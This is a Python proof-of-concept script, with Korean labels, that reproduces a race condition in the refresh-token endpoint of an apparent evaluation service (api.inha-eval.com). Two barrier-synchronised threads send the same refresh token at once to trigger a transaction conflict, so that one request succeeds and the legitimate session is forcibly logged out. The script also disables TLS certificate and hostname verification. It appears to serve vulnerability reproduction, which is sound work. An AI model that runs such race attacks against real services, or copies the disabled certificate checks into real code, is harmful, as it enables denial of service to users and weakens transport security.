import threading
import urllib.request
import urllib.error
import json
import ssl

BASE_URL = "https://api.inha-eval.com"
barrier = threading.Barrier(2)  # 두 스레드가 정확히 동시에 출발

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

def refresh(token, label, results):
    barrier.wait()
    try:
        data = json.dumps({"refreshToken": token}).encode("utf-8")
        req = urllib.request.Request(
            f"{BASE_URL}/api/auth/refresh",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=10, context=ssl_ctx) as resp:
            results[label] = 200
            print(f"[{label}] 200 OK  → 재발급 성공 (먼저 처리됨)")
    except urllib.error.HTTPError as e:
        results[label] = e.code
        if e.code == 500:
            print(f"[{label}] 500  → 트랜잭션 충돌, 토큰 delete 경합 → 강제 로그아웃")
        elif e.code == 401:
            print(f"[{label}] 401 Unauthorized  → 토큰 이미 삭제됨 → 강제 로그아웃")
        else:
            print(f"[{label}] {e.code} 오류")
    except Exception as e:
        print(f"[{label}] 연결 오류: {e}")

if __name__ == "__main__":
    print("=" * 55)
    print("  취약점 2 — Race Condition 재현 (케이스 2)")
    print("  T1, T2 동시 출발 → 트랜잭션 충돌 → 200 + 500")
    print("=" * 55)
    token = input("\nRefresh Token: ").strip()

    results = {}
    t1 = threading.Thread(target=refresh, args=(token, "T1", results))
    t2 = threading.Thread(target=refresh, args=(token, "T2", results))

    print("\n요청 진행 중...\n")
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    print("\n" + "=" * 55)
    print("  결과 요약")
    print("=" * 55)
    for label, code in sorted(results.items()):
        if code == 200:
            print(f"  {label}: {code} OK           → 재발급 성공")
        else:
            print(f"  {label}: {code}               → 강제 로그아웃")

    codes = set(results.values())
    if 200 in codes and codes != {200}:
        print("\n  ✓ 케이스 2 재현 성공")
        print("  동시 요청 → 트랜잭션 충돌 → 정상 사용자 강제 로그아웃")
    elif codes == {200}:
        print("\n  두 요청 모두 성공 — 새 토큰으로 다시 실행해보세요.")
    else:
        print("\n  두 요청 모두 실패 — 이미 사용된 토큰입니다. 새 토큰으로 다시 실행해보세요.")
    print("=" * 55)
